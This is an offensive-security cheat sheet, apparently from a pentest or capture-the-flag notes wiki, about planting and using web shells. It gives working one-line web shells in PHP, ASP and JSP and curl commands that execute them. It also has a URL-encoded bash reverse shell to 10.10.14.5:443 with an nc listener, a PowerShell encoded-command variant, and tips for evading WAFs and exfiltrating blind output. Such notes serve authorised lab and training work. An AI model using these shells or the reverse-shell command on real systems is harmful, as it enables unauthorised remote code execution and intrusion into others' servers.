# 🐚 Web Shells

> Small server-side scripts that run commands from a URL parameter. Dropped via [[File Upload]], [[SQL Injection]] `OUTFILE`, [[LFI]]/[[RFI]], or a writable webroot. First step to RCE — then pivot to a real reverse shell.

Part of [[Shells]]. Related: [[File Upload]] · [[RFI]] · [[Reverse & Bind Shells]] · [[HTTP]]

---

## 🧠 THINK
- Match the **language to the stack** (PHP/ASP/ASPX/JSP).
- Kali ships ready-made shells in `/usr/share/webshells/`.
- A webshell is a stepping stone — use it to fire a **reverse shell** immediately.
- Keep the parameter name simple; URL-encode command args.

## 🐚 MINIMAL SHELLS
PHP (`shell.php` → `?c=id`):
```php
<?php system($_GET['c']); ?>
```
```php
<?php echo shell_exec($_REQUEST['cmd']); ?>
```
ASP:
```asp
<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("c")).StdOut.ReadAll()) %>
```
JSP:
```jsp
<%= Runtime.getRuntime().exec(request.getParameter("c")) %>
```
Kali's bundled shells / a fuller-featured PHP shell:
```bash
ls /usr/share/webshells/          # php, asp, aspx, jsp, cfm
```

## 💥 USE IT → REVERSE SHELL
Confirm exec:
```bash
curl "http://$IP/uploads/shell.php?c=id"
```
Fire a reverse shell (URL-encoded):
```bash
nc -lvnp 443
```
```bash
curl "http://$IP/uploads/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/443+0>%261'"
```
Windows target → `?c=powershell+-e+<base64>`.

## 🔁 FOUND → NEXT
| SITUATION | NEXT |
|---|---|
| Webshell runs `id` | fire reverse shell → [[Reverse & Bind Shells]] |
| Need to place it | [[File Upload]] / [[SQL Injection]] OUTFILE / [[RFI]] |
| Can't reach the file | `ffuf` the upload dir; check response URL |
| Stack is IIS/Tomcat | `.aspx`/`.jsp` shell instead |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Uploads but won't execute | wrong dir/handler → include via [[LFI]]; find a web-served path |
| PHP tags stripped | `<?=`, `.phtml`/`.phar`, different language |
| Command output empty/blind | redirect to a file and read it, or exfil via curl |
| WAF blocks | rename param, encode, different shell |

## 📇 CHEAT SHEET
```php
<?php system($_GET['c']); ?>
```
```bash
curl "http://$IP/uploads/shell.php?c=id"
```
```bash
ls /usr/share/webshells/
```
**Kill shot:** drop webshell → `?c=id` → reverse shell → upgrade.
